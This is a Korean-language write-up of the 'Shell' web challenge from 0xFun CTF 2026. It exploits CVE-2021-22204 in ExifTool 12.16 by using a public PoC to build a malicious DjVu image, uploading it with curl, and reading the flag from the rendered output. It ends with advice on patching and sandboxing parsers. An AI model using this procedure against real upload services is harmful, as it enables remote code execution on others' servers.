# Shell (0xFun CTF 2026)

---

- **Name:** Shell
- **Category:** Web
- **Connection:** `http://chall.0xfun.org:52530`
- **Flag format:** `0xfun{...}`

---

### 개요

"이미지 파일만 업로드 가능합니다"라는 파일 업로드 서비스입니다.
파일을 올리면 EXIF 메타데이터를 파싱해서 화면에 출력해줍니다.

테스트 파일을 하나 올려보면 응답 `<pre>` 블록에 이런 정보가 나옵니다.

```
ExifTool Version Number : 12.16
File Type              : DJVU
```

서버 흐름이 보입니다.

```
파일 업로드 → exiftool <파일> 실행 → 출력을 <pre>에 렌더링
```

여기서 중요한 정보가 두 가지입니다.
**ExifTool 버전이 12.16**이고, **DjVu 포맷을 파싱한다**는 점입니다.

---

### 취약점 분석

#### CVE-2021-22204 — ExifTool DjVu RCE

ExifTool 12.16은 **CVE-2021-22204** 취약점이 있습니다.
DjVu 파일을 파싱하는 경로에서 임의 코드가 실행되는 RCE 버그입니다.

DjVu 파일 안에 특별히 조작된 바이트를 삽입하면,
ExifTool이 파싱하는 도중 내부적으로 `eval`과 유사한 경로를 타면서
**임베드된 셸 명령이 서버에서 실행**됩니다.

서버는 "이미지만 허용한다"고 하지만, 파일 확장자나 MIME 타입을 제한하는 것과
**파서 자체가 안전한 것**은 전혀 다른 문제입니다.

파서에 취약점이 있다면, 업로드 자체가 RCE 트리거가 됩니다.

#### 출력이 응답에 섞이는 구조

ExifTool이 실행되면서 명령 출력이 stdout으로 나오고,
서버는 그 결과를 그대로 HTML `<pre>`에 렌더링합니다.

즉, `cat /flag.txt`의 결과가 ExifTool 출력 맨 앞에 섞여서
**응답 HTML에 포함되어 돌아옵니다.**

---

### Exploit 실행 과정

DjVu 페이로드를 수작업으로 만들 수도 있지만,
바이트 수준에서 취약한 코드 경로를 정확히 건드려야 하기 때문에
검증된 PoC 생성기를 사용하는 것이 안정적입니다.

**Step 1 — PoC 생성기 준비**

```bash
git clone https://github.com/UNICORDev/exploit-CVE-2021-22204.git
cd exploit-CVE-2021-22204
```

**Step 2 — 악성 이미지 생성**

```bash
python3 exploit-CVE-2021-22204.py -c "cat /flag.txt"
# 출력: image.jpg
```

`-c` 옵션으로 서버에서 실행할 명령어를 지정합니다.
생성된 `image.jpg`의 내부에는 `cat /flag.txt` 명령이 임베드되어 있습니다.

**Step 3 — 업로드 및 응답 저장**

```bash
curl -s \
  -F 'file=@image.jpg;filename=image.jpg' \
  "http://chall.0xfun.org:52530/" \
  -o out.html
```

**Step 4 — 플래그 추출**

```bash
grep -oE '0xfun\{[^}]+\}' out.html
```

실행 결과:

```
0xfun{h1dd3n_p4yl04d_1n_pl41n_51gh7}
```

`<pre>` 블록 맨 앞, ExifTool 출력이 시작되기 전에 플래그가 출력됩니다.

### 요약

이 문제의 핵심은 **"이미지만 허용"이 보안이 아니라는 점**입니다.

파일 형식을 제한하는 것과 파서가 안전한 것은 별개입니다.
ExifTool 12.16의 DjVu 파싱 경로에는 임의 코드 실행 취약점이 있고,
서버가 업로드된 파일을 ExifTool에 그대로 넘기는 순간 RCE가 트리거됩니다.

파서의 출력을 HTML에 그대로 렌더링하는 구조까지 겹치면서,
실행된 명령의 결과가 응답에 포함되어 돌아옵니다.

파일을 파싱하는 서비스라면 파서 버전 관리와 샌드박스 격리가 필수입니다.
파서 자체에 취약점이 있으면 업로드 제한은 의미가 없습니다.
